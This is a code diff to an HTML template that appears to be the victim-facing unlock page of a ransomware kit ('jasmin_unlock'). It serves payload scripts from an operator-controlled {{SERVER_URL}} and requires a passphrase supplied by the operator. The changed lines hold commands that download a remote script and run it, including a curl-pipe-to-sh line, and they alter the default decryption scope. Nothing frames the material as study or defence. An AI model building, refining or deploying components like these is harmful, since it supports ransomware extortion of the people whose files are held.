@@ -32,12 +32,12 @@ pre{background:#1a1a2e;border:1px solid #333;padding:10px;border-radius:6px;over
 
 <h2>💻 Windows — requires PowerShell 7+</h2>
 <pre>curl.exe -sL {{SERVER_URL}}/payloads/jasmin_unlock.ps1 -o unlock.ps1
-pwsh -File unlock.ps1 -Server {{SERVER_URL}} -K "&lt;passphrase&gt;" -Paths C:\TargetFolder</pre>
+pwsh -File unlock.ps1 -Server {{SERVER_URL}} -K "&lt;passphrase&gt;"</pre>
 
 <h2>🐧 Linux / macOS — pure openssl, no dependencies</h2>
-<pre>curl -sL {{SERVER_URL}}/payloads/jasmin_unlock.sh | sh -s {{SERVER_URL}} "&lt;passphrase&gt;" &lt;target_folder&gt;</pre>
+<pre>curl -sL {{SERVER_URL}}/payloads/jasmin_unlock.sh | sh -s {{SERVER_URL}} "&lt;passphrase&gt;"</pre>
 
-<p>The passphrase and target folder are provided by the operator.</p>
+<p>Both commands decrypt <b>all</b> encrypted files by default. To limit the scope, append the folders you want, e.g. <code>"&lt;passphrase&gt;" /data /home</code>. The passphrase is provided by the operator.</p>
 
 <p style="margin-top:16px">✅ <b>SHA-256 integrity verification</b> guarantees every file is restored to its exact original state.</p>
 
